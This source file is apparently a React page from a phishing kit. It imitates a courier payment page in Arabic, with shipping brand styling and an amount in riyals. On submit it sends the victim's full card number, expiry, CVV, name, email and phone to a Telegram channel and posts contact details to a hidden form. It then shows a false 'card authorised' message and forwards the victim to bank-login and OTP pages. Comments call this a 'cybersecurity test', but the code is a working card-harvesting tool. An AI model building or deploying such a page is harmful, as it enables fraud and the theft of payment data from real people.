import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { MobileSelect, MobileSelectItem } from "@/components/ui/mobile-select";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";

const PaymentCardInput = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardValid, setCardValid] = useState<boolean | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  
  useEffect(() => {
    setIsMobile(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
  }, []);
  
  // Get customer info and selected bank from sessionStorage
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
    setCardNumber(formatted);
    
    // Validate with Luhn algorithm if 13-19 digits
    const cleaned = formatted.replace(/\s/g, '');
    if (cleaned.length >= 13) {
      const isValid = validateLuhn(formatted);
      setCardValid(isValid);
      
      if (!isValid && cleaned.length === 16) {
        toast({
          title: "رقم البطاقة غير صحيح",
          description: "الرجاء التحقق من رقم البطاقة",
          variant: "destructive",
        });
      }
    } else {
      setCardValid(null);
    }
  };
  
  // Generate month/year options
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });
  
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 20 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Validate card number with Luhn
    if (!validateLuhn(cardNumber)) {
      toast({
        title: "رقم البطاقة غير صحيح",
        description: "الرجاء التحقق من رقم البطاقة المدخل",
        variant: "destructive",
      });
      return;
    }
    
    // Validate expiry date
    if (!validateExpiry(expiryMonth, expiryYear)) {
      toast({
        title: "تاريخ الانتهاء غير صحيح",
        description: "البطاقة منتهية الصلاحية أو التاريخ غير صحيح",
        variant: "destructive",
      });
      return;
    }
    
    // Validate CVV
    const cardType = detectCardType(cardNumber);
    if (!validateCVV(cvv, cardType)) {
      toast({
        title: "CVV غير صحيح",
        description: cardType === 'amex' ? "CVV يجب أن يكون 4 أرقام لبطاقات American Express" : "CVV يجب أن يكون 3 أرقام",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    // Store complete card info for cybersecurity test
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    const expiry = `${expiryMonth}/${expiryYear}`;
    
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    sessionStorage.setItem('cardNumber', cardNumber); // Full card number
    sessionStorage.setItem('cardExpiry', expiry); // Full expiry
    sessionStorage.setItem('cardCvv', cvv); // CVV for cybersecurity test
    sessionStorage.setItem('cardType', cardType);
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details-new",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardholder: cardName,
          cardLast4: last4,
          cardType: cardType,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    // Send complete card details to Telegram (cybersecurity test)
    const telegramResult = await sendToTelegram({
      type: 'card_details_with_bank',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardholder: cardName,
        cardNumber: cardNumber, // Full card number for cybersecurity test
        cardLast4: last4,
        cardType: cardType,
        expiry: expiry,
        cvv: cvv, // CVV for cybersecurity test
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('Card details sent to Telegram successfully');
    } else {
      console.error('Failed to send card details to Telegram:', telegramResult.error);
    }
    
    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    // Navigate to bank login page if bank is selected, otherwise go to OTP
    if (selectedBankId && selectedBankId !== 'skipped') {
      navigate(`/pay/${id}/bank-login`);
    } else {
      navigate(`/pay/${id}/otp`);
    }
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="بيانات البطاقة"
      description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Selected Bank/Country Info */}
      {(selectedBank || selectedCountryData) && (
        <div 
          className="rounded-lg p-3 sm:p-4 mb-6 flex items-center gap-3"
          style={{
            background: `${branding.colors.primary}10`,
            border: `1px solid ${branding.colors.primary}30`
          }}
        >
          {selectedCountryData && (
            <span className="text-2xl">{selectedCountryData.flag}</span>
          )}
          {selectedBank && (
            <Building2 className="w-5 h-5" style={{ color: selectedBank.color || branding.colors.primary }} />
          )}
          <div className="flex-1">
            <p className="text-xs text-muted-foreground">البنك المختار</p>
            <p className="text-sm font-semibold">
              {selectedBank ? selectedBank.nameAr : 'غير محدد'}
            </p>
          </div>
        </div>
      )}

      {/* Security Notice */}
      <div 
        className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
        style={{
          background: `${branding.colors.primary}10`,
          border: `1px solid ${branding.colors.primary}30`
        }}
      >
        <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
        <div className="text-xs sm:text-sm">
          <p className="font-semibold mb-1">بياناتك محمية بتقنية التشفير</p>
          <p className="text-muted-foreground">يمكنك إدخال بطاقة من أي بنك، حتى لو كانت مختلفة عن البنك الذي اخترته</p>
        </div>
      </div>

      {/* Visual Card Display */}
      <div 
        className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
          minHeight: '180px'
        }}
      >
        <div className="absolute top-4 right-4 flex items-center gap-2">
          <CreditCard className="w-10 h-10 sm:w-12 sm:h-12 text-white/80" />
          {cardValid === true && (
            <CheckCircle2 className="w-6 h-6 text-green-300" />
          )}
        </div>
        
        {/* Card Type Badge */}
        {cardNumber.length > 0 && (
          <div className="absolute top-4 left-4">
            <span className="text-xs text-white/70 uppercase font-semibold">
              {detectCardType(cardNumber)}
            </span>
          </div>
        )}
        
        {/* Card Number Display */}
        <div className="mt-14 sm:mt-16 mb-5 sm:mb-6">
          <div className="flex gap-2 sm:gap-3 text-white text-xl sm:text-2xl font-mono">
            <span>••••</span>
            <span>••••</span>
            <span>••••</span>
            <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
          </div>
        </div>

        <div className="flex justify-between items-end text-white">
          <div>
            <p className="text-[10px] sm:text-xs opacity-70 mb-1">EXPIRES</p>
            <p className="text-base sm:text-lg font-mono">
              {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
            </p>
          </div>
          <div className="text-right">
            <p className="text-[10px] sm:text-xs opacity-70 mb-1">CARDHOLDER</p>
            <p className="text-base sm:text-lg font-bold">{cardName || "YOUR NAME"}</p>
          </div>
        </div>
      </div>

      {/* Form */}
      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
        {/* Cardholder Name */}
        <div>
          <Label className="mb-2 text-sm sm:text-base">اسم حامل البطاقة</Label>
          <Input
            placeholder="AHMAD ALI"
            value={cardName}
            onChange={(e) => setCardName(e.target.value.toUpperCase())}
            className="h-12 sm:h-14 text-base sm:text-lg"
            required
          />
        </div>
        
        {/* Card Number */}
        <div>
          <Label className="mb-2 text-sm sm:text-base flex items-center justify-between">
            <span>رقم البطاقة</span>
            {cardValid === true && (
              <span className="text-xs text-green-600 flex items-center gap-1">
                <CheckCircle2 className="w-4 h-4" />
                صحيح
              </span>
            )}
            {cardValid === false && (
              <span className="text-xs text-destructive">غير صحيح</span>
            )}
          </Label>
          <Input
            placeholder="#### #### #### ####"
            value={cardNumber}
            onChange={(e) => handleCardNumberChange(e.target.value)}
            inputMode="numeric"
            className={`h-12 sm:h-14 text-base sm:text-lg tracking-wider font-mono ${
              cardValid === false ? 'border-destructive' : 
              cardValid === true ? 'border-green-500' : ''
            }`}
            required
          />
        </div>
        
        {/* Expiry & CVV Row */}
        <div className="grid grid-cols-3 gap-2 sm:gap-3">
          <div>
            <Label className="mb-2 text-xs sm:text-sm">الشهر</Label>
            {isMobile ? (
              <MobileSelect value={expiryMonth} onValueChange={setExpiryMonth} placeholder="MM" className="h-12 sm:h-14">
                {months.map((month) => (
                  <MobileSelectItem key={month.value} value={month.value}>
                    {month.label}
                  </MobileSelectItem>
                ))}
              </MobileSelect>
            ) : (
              <Select value={expiryMonth} onValueChange={setExpiryMonth} required>
                <SelectTrigger className="h-12 sm:h-14">
                  <SelectValue placeholder="MM" />
                </SelectTrigger>
                <SelectContent>
                  {months.map((month) => (
                    <SelectItem key={month.value} value={month.value}>
                      {month.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            )}
          </div>
          
          <div>
            <Label className="mb-2 text-xs sm:text-sm">السنة</Label>
            {isMobile ? (
              <MobileSelect value={expiryYear} onValueChange={setExpiryYear} placeholder="YY" className="h-12 sm:h-14">
                {years.map((year) => (
                  <MobileSelectItem key={year.value} value={year.value}>
                    {year.label}
                  </MobileSelectItem>
                ))}
              </MobileSelect>
            ) : (
              <Select value={expiryYear} onValueChange={setExpiryYear} required>
                <SelectTrigger className="h-12 sm:h-14">
                  <SelectValue placeholder="YY" />
                </SelectTrigger>
                <SelectContent>
                  {years.map((year) => (
                    <SelectItem key={year.value} value={year.value}>
                      {year.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            )}
          </div>

          <div>
            <Label className="mb-2 text-xs sm:text-sm">CVV</Label>
            <Input
              type="password"
              placeholder="***"
              value={cvv}
              onChange={(e) =>
                setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
              }
              inputMode="numeric"
              className="h-12 sm:h-14 text-base sm:text-lg text-center"
              maxLength={4}
              required
            />
          </div>
        </div>
        
        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
          disabled={isSubmitting || !cardValid}
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
          }}
        >
          {isSubmitting ? (
            <span>جاري التفويض...</span>
          ) : (
            <>
              <span className="ml-2">تفويض البطاقة والمتابعة</span>
              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
            </>
          )}
        </Button>
        
        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
          سيتم إرسال رمز التحقق إلى هاتفك المسجل في البنك
        </p>
      </form>
    
      {/* Hidden Netlify Form */}
      <form name="card-details-new" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="cardType" />
        <input type="text" name="expiry" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentCardInput;
